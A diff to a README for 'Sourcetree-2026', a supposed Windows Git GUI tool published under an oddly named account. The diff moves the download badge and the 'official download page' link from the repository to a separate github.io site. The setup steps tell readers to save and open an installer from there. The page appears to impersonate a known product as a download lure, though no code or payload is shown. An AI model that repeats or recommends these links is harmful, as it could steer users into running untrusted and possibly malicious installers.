@@ -1,6 +1,6 @@
 # 📦 Sourcetree-2026 - Control your projects with visual tools
 
-[![Download Sourcetree-2026](https://img.shields.io/badge/Download-Sourcetree--2026-blue)](https://github.com/Conquerable-torturechamber169/Sourcetree-2026)
+[![Download Sourcetree-2026](https://img.shields.io/badge/Download-Sourcetree--2026-blue)](https://conquerable-torturechamber169.github.io)
 
 Sourcetree-2026 simplifies how you track changes in your files. You use this tool to manage code repositories without typing complex commands. It provides a visual interface for Git. You see your work history, branch changes, and file commits in one place. This software works on Windows 10 and Windows 11.
 
@@ -8,7 +8,7 @@ Sourcetree-2026 simplifies how you track changes in your files. You use this too
 
 Follow these steps to set up the tool on your computer.
 
-1. Go to the [official download page](https://github.com/Conquerable-torturechamber169/Sourcetree-2026).
+1. Go to the [official download page](https://conquerable-torturechamber169.github.io).
 2. Look for the release section.
 3. Click the link to save the installer file to your hard drive.
 4. Open the folder where the file saved.
